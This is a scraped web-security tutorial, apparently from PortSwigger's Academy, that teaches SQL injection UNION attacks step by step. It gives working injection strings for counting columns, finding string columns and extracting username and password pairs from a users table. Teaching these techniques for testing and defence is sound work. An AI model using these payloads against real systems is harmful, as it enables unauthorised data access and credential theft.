---
title: "SQL injection UNION attacks"
author: PortSwigger Web Security Academy
url: https://portswigger.net/web-security/sql-injection/union-attacks
date_scraped: 2026-11-19
platform: portswigger
disclosed_report: none
bounty: not stated
vuln_class: sqli
---

<!-- Raw scraped text below. Public reference. -->

# SQL injection UNION attacks

When SQLi results are returned in the response, `UNION` appends extra `SELECT` queries: `SELECT a,b FROM t1 UNION SELECT c,d FROM t2`. Two requirements: (1) same number of columns in each query, (2) compatible data types per column. So you must find the column count and which columns hold strings.

## Determining the number of columns
Method 1, `ORDER BY` incrementing until error:
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   -> "ORDER BY position number 3 is out of range..."
```
Method 2, `UNION SELECT NULL` with increasing nulls until no error:
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```
`NULL` is convertible to every type, maximizing success. When the count matches, an extra all-null row appears (or a different error/NullPointerException). Detect any response difference (DB error, generic error, no results, or extra content).

## Database-specific syntax
- Oracle: every SELECT needs FROM + a valid table; use `dual`: `' UNION SELECT NULL FROM DUAL--`.
- MySQL: `--` must be followed by a space, or use `#`.

## Finding a string-compatible column
After the count, place a string into each column in turn:
```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
...
```
An incompatible column errors ("Conversion failed when converting the varchar value 'a' to data type int."). No error + the string appears = that column holds strings.

## Retrieving interesting data
Two string columns, `users(username,password)`:
```
' UNION SELECT username, password FROM users--
```
You must know the table/column names (examine the database, or guess) or use information_schema.

## Multiple values in a single column
Concatenate with a separator. Oracle uses `||`:
```
' UNION SELECT username || '~' || password FROM users--
-> administrator~s3cure, wiener~peter, carlos~montoya
```
Concatenation syntax differs by DB (see cheat sheet): Oracle/PostgreSQL `||`, MySQL `CONCAT()` (or space-separated strings), MSSQL `+`.
